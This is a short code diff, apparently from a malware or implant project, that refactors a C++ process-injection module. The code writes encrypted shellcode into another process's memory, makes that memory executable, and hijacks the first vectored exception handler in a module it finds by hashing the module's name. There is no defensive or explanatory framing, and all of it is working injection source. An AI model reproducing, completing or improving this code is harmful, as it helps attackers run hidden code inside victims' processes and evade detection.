@@ -35,7 +35,7 @@ namespace Injection {
 
         //Xtea::XteaCrypt(B_PTR(shellcode), n_shellcode, Ctx->Config.Key, FALSE);
 
-        x_ntassert(Ctx->nt.NtWriteVirtualMemory(process, C_PTR(hook + writer.loader->length), shellcode, n_shellcode, &write));
+        x_ntassert(Ctx->nt.NtWriteVirtualMemory(process, RVA(PBYTE, hook, writer.loader->length), shellcode, n_shellcode, &write));
         x_assert(write != n_shellcode);
 
         x_ntassert(Ctx->nt.NtProtectVirtualMemory(process, (void**) &hook, &n_shellcode, PAGE_EXECUTE_READ, nullptr));
@@ -82,7 +82,7 @@ namespace Injection {
 
         NTSTATUS OverwriteFirstHandler(_veh_writer const &writer) {
 
-            const auto mod_hash = Utils::GetHashFromStringW(writer.mod_name, x_wcslen(writer.mod_name));
+            const auto mod_hash = Utils::HashStringW(writer.mod_name, x_wcslen(writer.mod_name));
             const auto ntdll    = Memory::Modules::GetModuleEntry(mod_hash);
 
             const auto entry    = GetFirstHandler(ntdll, writer.signature, writer.mask);
